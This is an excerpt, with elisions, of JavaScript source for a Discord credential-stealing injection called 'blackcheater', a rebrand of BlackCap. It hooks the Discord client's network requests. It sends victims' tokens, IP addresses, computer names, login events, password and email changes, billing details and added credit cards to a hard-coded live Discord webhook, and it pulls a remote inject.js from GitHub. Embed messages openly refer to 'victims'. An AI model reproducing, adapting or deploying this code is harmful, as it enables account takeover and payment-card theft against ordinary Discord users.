...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Ogbejoshua/blackcheater/main/inject.js",
    webhook: "https://discord.com/api/webhooks/1213230576195207218/HUBHnNMCvJgpQRdtqP7tq55lFEA_tYq0DBjj-cOxymzgQYai5utdMpY8ARPW_SokZCKY",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: "gavin born | https://github.com/Ogbejoshua/blackcheater.git  "
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/blackcheater")) fs.rmdirSync(__dirname + "/blackcheater")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "blackcheater Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Blackcheater 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Ogbejoshua/blackcheater)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Blackcheater Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
                    ...
                    name: "@Copyright",
                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>]((https://github.com/Ogbejoshua/blackcheater)`,
                    inline: !0
                }, {
                    name: "Billing <a:billing:1041641103629234196>",
                    value: `${Billings}`,
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "Blackcheater User Login",
                description: "[<a:blackcheatergif:1041634542093619260>  **Oh you have BlackCheater someone**](https://github.com/Ogbejoshua)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    ...
                    name: "@Copyright",
                    value: `[BlackCheater <a:blackcheatergif:1041634542093619260>]((https://github.com/Ogbejoshua/blackcheater)`,
                    inline: !0
                }, {
                    name: "Billing <a:billing:1041641103629234196>",
                    value: `${Billings}`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Blackcheater Detect Password Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**]((https://github.com/Ogbejoshua/blackcheater)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Blackcheater Detect Email Changed",
                    ...
                    fields: [{
                        ...
                        name: "@Copyright",
                        value: `[Blakcheater 2023 <a:blackcapgif:1041634542093619260>]((https://github.com/Ogbejoshua/blackcheater)`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Blackcheater User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
